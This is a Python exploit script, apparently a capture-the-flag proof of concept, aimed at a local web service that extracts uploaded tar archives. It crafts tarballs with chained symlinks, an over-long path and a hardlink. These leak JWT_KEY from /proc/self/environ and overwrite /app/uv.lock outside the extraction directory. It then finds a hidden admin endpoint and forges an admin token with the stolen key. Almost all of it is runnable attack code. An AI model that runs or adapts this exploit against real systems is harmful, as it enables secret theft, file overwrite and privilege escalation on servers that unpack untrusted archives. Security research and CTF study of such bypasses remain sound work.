import requests
from io import BytesIO
import tarfile
import io
import jwt
import os

BASE_URL = "http://localhost:8000/".rstrip("/")

# step 1: get the jwt key
target = 'proc/self/environ'
name1 = 'pwn.txt'
with tarfile.open('poc1.tar.gz', 'w:gz') as tar:
    def addmemb(name, **kwargs):
        memb = tarfile.TarInfo(name)
        for k, v in kwargs.items():
            getattr(memb, k)
            setattr(memb, k, v)
        tar.addfile(memb)
    # lrw-r--r-- pwn.txt -> .
    addmemb(name1, type=tarfile.SYMTYPE, linkname='.')
    # drwxrwxrwx pwn.txt/
    addmemb(name1, type=tarfile.DIRTYPE, mode=0o777)
    # lrw-r--r-- pwn.txt -> x/x/x/x/???/x/../../../../???/../TARGET
    addmemb(name1, type=tarfile.SYMTYPE, linkname=('x/' * 99 + '../' * 99 + target))
    # lrw-r--r-- x/x/x/x/???/x -> ../../../???/..
    addmemb(('x/' * 99), type=tarfile.SYMTYPE, linkname=('../' * 98))
response = requests.post(BASE_URL + "/api/file/encrypt", files={
    'file': ('poc1.tar.gz', open('poc1.tar.gz', 'rb'), 'application/x-gzip'),
})
response = requests.post('http://localhost:8000/api/decrypt', json={
    'text': response.json()["data"]["pwn.txt"],
})
leak = response.json()["data"]
jwt_key = leak[leak.index("JWT_KEY="):].split("\u0000")[0].split("=")[1]
print("step 1", jwt_key)

# step 2: overwrite /app/uv.lock with our fake
comp = 'd' * 251
steps = "abcdefghijklmnop"
path = ""
# noinspection PyRedeclaration
with tarfile.open("poc2.tar.gz", mode="w:gz") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../app/"
    tar.addfile(e)

    # use the symlinks above, that are not checked, to create a hardlink
    # to a file outside of the destination path
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/uv.lock"
    tar.addfile(f)
    # now that we have the hardlink we can overwrite the file
    content = open("fake-uv.lock", 'rb').read()
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

    # # we can also create new files as well!
    # content = b"new!\n"
    # n = tarfile.TarInfo("escape/newfile")
    # n.type = tarfile.REGTYPE
    # n.size = len(content)
    # tar.addfile(n, fileobj=io.BytesIO(content))
response = requests.post(BASE_URL + "/api/file/encrypt", files={
    'file': ('poc2.tar.gz', open('poc2.tar.gz', 'rb'), 'application/x-gzip'),
})
print("step 2", response.text)

# step 3: get hidden endpoint name
res = requests.get(BASE_URL + "/schema/swagger").text
admin_endpoint = res[res.index("/api/admin/upgrade"):].split('"')[0]
print("step 3", admin_endpoint)

# step 4: profit
res = requests.post(BASE_URL + admin_endpoint, headers={"r3-token": jwt.encode({"role": "admin"}, jwt_key, algorithm="HS256")})
print(res.text)